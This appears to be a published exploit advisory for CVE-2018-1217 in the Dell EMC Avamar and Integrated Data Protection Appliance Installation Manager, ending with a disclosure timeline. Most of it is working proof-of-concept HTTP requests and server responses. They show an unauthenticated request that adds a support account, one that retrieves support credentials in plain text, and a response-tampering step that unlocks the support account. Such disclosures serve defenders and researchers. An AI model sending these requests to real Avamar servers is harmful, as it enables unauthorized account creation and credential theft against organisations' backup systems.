@@ -1,0 +1,143 @@
+# Exploit Title: [Dell EMC Avamar and Integrated Data Protection Appliance Installation Manager Missing Access Control Vulnerability (DSA-2018-025)]
+# Date: [24/11/2017]
+# Exploit Author: [SlidingWindow]
+# Vendor Homepage: [https://store.Dell EMC.com/en-us/AVAMAR-PRODUCTS/Dell-DELL EMC-Avamar-Virtual-Edition-Data-Protection-Software/p/DELL EMC-Avamar-Virtual-Edition]
+# Version: [Dell EMC Avamar Server 7.3.1 , Dell EMC Avamar Server 7.4.1, Dell EMC Avamar Server 7.5.0, Dell EMC Integrated Data Protection Appliance 2.0, Dell EMC Integrated Data Protection Appliance 2.1]
+# Tested on: [Dell EMC Avamar Virtual Edition version 7.5.0.183]
+# CVE : [CVE-2018-1217]
+
+==================
+#Product:-
+==================
+EMC Avamar Virtual Edition is great for enterprise backup data protection for small and medium sized offices. EMC Avamar Virtual Edition is optimized for backup and recovery of virtual and physical servers,enterprise applications,remote offices,and desktops or laptops.
+
+==================
+#Vulnerability:-
+==================
+Dell EMC Avamar and Integrated Data Protection Appliance Installation Manager Missing Access Control Vulnerability (DSA-2018-025)
+
+========================
+#Vulnerability Details:-
+========================
+
+=====================================================================================================================================================
+1. Missing functional level access control allows an unauthenticated user to add DELL EMC Support Account to the Installation Manager (CVE-2018-1217)
+=====================================================================================================================================================
+
+DELL EMC Avamar fails to restrict access to Configuration section that let Administrators set up Installation Manager configurations, or check for new packages from the Online Support site. An unauthenticated, remote attacker could add an Online Support Account for DELL EMC without any user interaction.
+
+#Proof-Of-Concept:
+------------------
+1. Send following request to the target:
+
+POST /avi/avigui/avigwt HTTP/1.1
+Host: <target_ip>
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/x-gwt-rpc; charset=utf-8
+X-GWT-Permutation: 8EGHBE4312AFBC12325324123DF4545A
+X-GWT-Module-Base: https://<target_ip>/avi/avigui/
+Referer: https://<target_ip>/avi/avigui.html
+Content-Length: 452
+Connection: close
+
+7|0|7|https://<target_ip>/avi/avigui/|60AF6BC6976F9B1F05AC454813F5324D|com.avamar.avinstaller.gwt.shared.AvinstallerService|saveLDLSConfig|java.lang.String/2004016611|<target_ip>|{"proxyHost":null, "proxyPort":0, "useProxyAuthentication":false, "proxyUsername":null, "proxyPassword":null, "disableInternetAccess":false, "proxyEnable":false, "emcsupportUsername":"hacker", "emcsupportPassword":"hacked3", "disableLDLS":false}|1|2|3|4|3|5|5|5|6|0|7|
+
+2. Log into Avamar Installation Manager and navigate to Configuration tab to make sure that the user 'hacker' was added successfully.
+
+
+=========================================================================================================================================================
+2. Missing functional level access control allows an unauthenticated user to retrieve DELL EMC Support Account Credentials in Plain Text (CVE-2018-1217)
+=========================================================================================================================================================
+
+DELL EMC Avamar fails to restrict access to Configuration section that let Administrators set up Installation Manager configurations, or check for new packages from the Online Support site. An unauthenticated, remote attacker could retrieve Online Support Account password in plain text.
+
+#Proof-Of-Concept:
+------------------
+1. Send following request to the target:
+
+POST /avi/avigui/avigwt HTTP/1.1
+Host: <target_ip>
+Connection: Keep-Alive
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: */*
+Content-Type: text/x-gwt-rpc; charset=utf-8
+X-GWT-Permutation: 3AF662C052F0EB9D3D51649D2293F6EC
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.5
+DNT: 1
+Content-Length: 192
+
+
+7|0|6|https://<target_ip>/avi/avigui/|60AF6BC6976F9B1F05AC454813F5324D|com.avamar.avinstaller.gwt.shared.AvinstallerService|getLDLSConfig|java.lang.String/2004016611|<target_ip>|1|2|3|4|2|5|5|6|0|
+
+2. Server returns credentials in plain text:
+
+HTTP/1.1 200 OK
+Date: Fri, 17 Nov 2017 10:46:31 GMT
+Server: Jetty(9.0.6.v20130930)
+Content-Type: application/json; charset=utf-8
+Content-Disposition: attachment
+Content-Length: 275
+Connection: close
+
+//OK[1,["{\"proxyHost\":null,\"proxyPort\":0,\"useProxyAuthentication\":false,\"proxyUsername\":\"\",\"proxyPassword\":\"\",\"disableInternetAccess\":false,\"proxyEnable\":false,\"emcsupportUsername\":\"hacker\",\"emcsupportPassword\":\"hacked3\",\"disableLDLS\":false}"],0,7]
+
+
+=========================================================================================================================================================
+3. Improper validation of ëDELL EMC Customer Support passcodeí allows an authenticated user to unlock DELL EMC Support Account and download verbose logs
+=========================================================================================================================================================
+
+DELL EMC Avamar fails to validate ëDELL EMC Customer Support passcodeí properly allowing an authenticated user to unlock the support account and view/download verbose logs. However, according to vendor, this one seems to be a vulnerability but it's an ambuious functionality instead.
+
+#Proof-Of-Concept:
+------------------
+1. Try to unlock the support account with an invalid password and you get error 'Customer Support Access Denied':
+2. Now send the same request again (with invalid password) and tamper the server response:
+
+Request:
+---------
+POST /avi/avigui/avigwt HTTP/1.1
+Host: <target_ip>
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/x-gwt-rpc; charset=utf-8
+X-GWT-Permutation: 3AF662C052F0EB9D3D51649D2293F6EC
+X-GWT-Module-Base: https://<target_ip>/avi/avigui/
+Referer: https://<target_ip>/avi/avigui.html
+Content-Length: 202
+Cookie: supo=x; JSESSIONID=9tt4unkdjjilbo072x4nji2y
+Connection: close
+
+7|0|7|https://<target_ip>/avi/avigui/|60AF6BC6976F9B1F05AC454813F5324D|com.avamar.avinstaller.gwt.shared.AvinstallerService|supportLogin|java.lang.String/2004016611|<target_ip>|1|2|3|4|3|5|5|5|6|0|7|
+
+
+Tampered response:
+--------------------
+HTTP/1.1 200 OK
+Date: Fri, 24Nov 2017 07:57:25 GMT
+Server: Jetty(9.0.6.v20130930)
+X-Frame-Options: SAMEORIGIN
+Content-Type: application/json; charset=utf-8
+Content-Disposition: attachment
+Content-Length: 21
+Connection: close
+
+//OK[1,["true"],0,7]
+
+3. This unlocks the support account and enabled the 'Log' download button.
+
+
+===================================
+#Vulnerability Disclosure Timeline:
+===================================
+
+11/2017: First email to disclose the vulnerability to EMC Security Response Team.
+12/2017: Vendor confirmed vulnerability#1 and vulnerability#3, and discarded vulnerability#3 stating that this is an ambigious functionaliy and not a vulnerability.
+12/2017: Vendor confirmed that the fix will be released in January 2018.
+01/2018: Vendor delayed the fix release stating that the Dell EMC IDPA is also vulnerable.0
+04/2018: Vendor assigned CVE-2018-1217 and pubished the advisory 'DSA-2018-025: Dell EMC Avamar and Integrated Data Protection Appliance Installation Manager Missing Access Control Vulnerability': http://seclists.org/fulldisclosure/2018/Apr/14
